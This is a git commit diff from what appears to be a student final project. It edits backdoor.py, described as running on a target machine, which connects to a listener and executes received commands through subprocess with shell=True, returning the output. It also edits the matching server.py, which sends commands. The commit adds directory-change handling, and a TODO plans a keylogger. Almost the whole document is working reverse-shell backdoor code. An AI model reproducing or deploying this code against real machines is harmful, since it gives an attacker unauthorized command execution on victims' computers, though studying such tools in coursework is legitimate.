f7897b5680805e2bcd2927a02b1f2214162755fb
Valkor Simpson <hns13@students.uwf.edu>
2022-12-03 14:05:26 -0600

    working on cd

--- final_project/backdoor.py
+++ final_project/backdoor.py
@@ -1,6 +1,4 @@
 #backdoor that runs on target machine
-
-
 import socket
 import json
 import os
@@ -9,45 +7,52 @@ import subprocess
 import threading
 import time
 
-
-
 ip = '127.0.0.1'
 port = 4141
 
 client = socket.socket()
-
 client.connect((ip, port))
 print("connected")
 
-#TODO put getting command in a function (step 3)
 def execute_shell():
     while True:
-        command = client.recv(1024)
-        command = command.decode()
-        if command == 'quit':
+        data = client.recv(1024)
+        data = data.decode()
+        print(f"command received: {data}")
+
+        if data == 'quit':
             break
-        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+        #elif data == 'cd':
+
+
+        
+        try:
+            print(data)
+            command, params = data.split(" ", 1)
+            print(command ,params)
+            if command == "cd":
+                os.chdir(params)
+                print("chdir to %s" % (params))
+                data = os.getcwd()
+                print("continueing")
+                continue
+        except:
+            print("failed to split")
+            pass
+        
+
+        op = subprocess.Popen(data, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
         output = op.stdout.read()
         output_error = op.stderr.read()
         #send response/output back to attacker
         #print(f"sending: {output.decode() + output_error.decode()}")
-        print(f"sent output from command: {command}")
+        print(f"sent output from command: {data}")
+        print(output + output_error)
         client.send(output + output_error)
         
 
 execute_shell()
-# main loop
-# while True:
-#     #wait for a command from attacker
-#     command = client.recv(1024)
-#     command = command.decode()
-#     op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-#     output = op.stdout.read()
-#     output_error = op.stderr.read()
-#     #send response/output back to attacker
-#     #print(f"sending: {output.decode() + output_error.decode()}")
-#     print(f"sent output from command: {command}")
-#     client.send(output + output_error)
+
 
 
 
--- final_project/server.py
+++ final_project/server.py
@@ -15,18 +15,13 @@ port = 4141
 
 server = socket.socket()
 server.bind((ip, port))
-
 print('listening For target connection ...')
 server.listen(1)
 client, client_addr = server.accept()
 print(f'[+] {client_addr} connected')
 
-#TODO make and use a function named "target_communication" (step 3)
-#...name doesn't make sense but whatever
-
 # send commands and receive output in loop
 def target_communication():
-    #count = 0 #why...
     while True:
         command = input('* Shell~%s: ' % str(ip))
         is_quitting = command == 'quit'
@@ -44,12 +39,3 @@ target_communication()
 #TODO (step 5) make the cd command work basically
 
 #TODO (step 6) "keylog command"
-
-
-# while True:
-#     command = input('enter command: ')
-#     command = command.encode()
-#     client.send(command)
-#     output = client.recv(1024)
-#     output = output.decode()
-#     print(f"output: {output}")
